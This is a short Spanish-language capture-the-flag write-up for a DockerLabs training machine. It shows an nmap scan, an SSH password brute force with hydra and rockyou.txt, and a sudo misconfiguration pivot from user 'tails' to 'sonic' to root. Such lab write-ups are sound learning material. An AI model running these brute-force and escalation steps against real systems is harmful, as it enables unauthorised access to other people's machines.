# Write-up - Escalada con Pivoting de Usuario

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 27/05/2025  
**Aprendizaje:** Escalé privilegios pivotando de un usuario con acceso limitado a otro con configuraciones de sudo mal configuradas. Esta técnica es importante para identificar vectores de escalada horizontal y vertical dentro de un sistema.

---

## Enumeración y acceso inicial

### 1. Escaneo de puertos

`nmap -sSV -O --open 172.17.0.2`

> Resultado:

`22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5`

`80/tcp open http Apache httpd 2.4.58`

`SO Inferido: Linux`

### 2. Análisis web

Se accede a `http://172.17.0.2` y se encuentra como pista la palabra "tails" en la página principal.

### 3. Fuerza bruta SSH

`hydra -l tails -P rockyou.txt ssh://172.17.0.2`

Credenciales encontradas:  
Usuario: `tails`  
Contraseña: `3117548331`  

### 4. Acceso por SSH

`ssh -l tails 172.17.0.2`

## Escalada de privilegios (pivoting)

5. Verificar permisos sudo del usuario `tails`

`sudo -l`

> Resultado

`User tails may run the following commands on 1a7b08d71419: (sonic) NOPASSWD: ALL`

El usuario `tails` puede ejecutar cualquier comando como el usuario sonic sin necesidad de contraseña.

### 6. Cambiar a la shell del usuario sonic

`sudo -u sonic /bin/bash`

### 7. Verificar permisos sudo del usuario sonic

`sudo -l`

> Resultado:

`User sonic may run the following commands on 1a7b08d71419: (ALL) NOPASSWD: ALL`

El usuario `sonic` puede ejecutar cualquier comando como cualquier usuario, incluyendo `root`.

### 8. Obtener acceso como root

`sudo su`

> whoami = root
